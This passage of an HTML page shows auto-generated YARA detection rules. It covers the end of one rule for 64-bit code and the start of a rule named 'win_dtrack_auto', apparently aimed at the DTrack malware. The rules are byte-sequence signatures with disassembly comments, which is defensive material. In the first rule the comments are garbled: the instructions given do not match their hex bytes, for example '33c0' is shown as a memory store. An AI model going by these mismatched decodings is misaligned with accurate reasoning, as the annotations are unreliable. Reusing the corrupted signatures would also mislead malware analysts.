&nbsp; $sequence_5 = { 4881eca0000000 33c0 488bd9 488d4c2432 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4881eca0000000&nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dword ptr [ebp + 0x4c8], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bd9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx + 4]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d4c2432&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp + 0x4d0], eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_6 = { 488b01 eb03 488bc1 0fb600 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;eb03&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ebx, dword ptr [ebp + ebp]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bc1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb600&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movups&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xmmword ptr [edi], xmm0<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_7 = { 488b01 8b10 895124 448b4124 4585c0 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| sub&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x30<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;895124&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ebx, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;448b4124&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4585c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; ecx, eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_8 = { 4c8d0d31eb0000 c1e918 c1e808 41bf00000080 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4c8d0d31eb0000&nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x1e6<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e918&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e808&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, [0xbda0]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;41bf00000080&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_9 = { 488bd8 4885c0 752d ff15???????? 83f857 0f85e0010000 488d0da0bd0000 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bd8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4885c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ebx, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;752d&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83f857&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| test&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f85e0010000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x2f<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d0da0bd0000&nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, 0x57<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_10 = { 75d4 488d1d7f6c0100 488b4bf8 4885c9 740b }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;75d4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, [0xeb31]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d1d7f6c0100&nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 0x18<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b4bf8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4885c9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;740b&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edi, 0x80000000<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_11 = { 0f85d9000000 488d15d0c90000 41b810200100 488bcd e8???????? eb6b b9f4ffffff }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f85d9000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0xffffffd6<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d15d0c90000&nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;41b810200100&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ebx, [0x16c7f]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bcd&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;eb6b&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; ecx, dword ptr [ebx - 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;b9f4ffffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_12 = { 48890d???????? 488905???????? 488d05ae610000 488905???????? 488d05a0550000 488905???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;//&nbsp; &nbsp; 48890d????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488905????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d05ae610000&nbsp; &nbsp; &nbsp; &nbsp;| test&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488905????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // &nbsp; 488d05a0550000&nbsp; &nbsp; &nbsp; &nbsp;| je&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x10<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488905????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_13 = { 8bcf e8???????? 488b7c2448 85c0 0f8440030000 488d0560250100 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8bcf&nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 0x12010<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b7c2448&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;85c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, ebp<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f8440030000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x83<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d0560250100&nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 0xfffffff4<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_14 = { ff15???????? 8b05???????? 2305???????? ba02000000 33c9 8905???????? 8b05???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b05????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;2305????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ba02000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, [0x61ae]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8905????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b05????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_15 = { 4883ec30 498bd8 e8???????? 488bc8 4885c0 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4883ec30&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0xdf<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;498bd8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bc8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, [0xc9d0]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4885c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br><br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; 7 of them and filesize &lt; 557056<br>}</td>
</tr>
<tr>
<td>rule win_dtrack_auto {<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_0 = { 52 8b4508 50 e8???????? 83c414 8b4d10 51 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 400<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;52&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4508&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp + 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c414&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x14<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4d10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp + 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_1 = { 3a4101 7523 83854cf6ffff02 838550f6ffff02 80bd4af6ffff00 75ae c78544f6ffff00000000 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;3a4101&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;al, byte ptr [ecx + 1]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp; 7523&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x25<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83854cf6ffff02&nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x9b4], 2<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;838550f6ffff02&nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x9b0], 2<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;80bd4af6ffff00&nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;byte ptr [ebp - 0x9b6], 0<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;75ae&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0xffffffb0<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c78544f6ffff00000000&nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x9bc], 0<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_2 = { 50 ff15???????? a3???????? 68???????? e8???????? 83c404 50 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;a3????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;68????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c404&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 4<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp;eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_3 = { 8d8dd4faffff 51 e8???????? 83c408 8b15???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 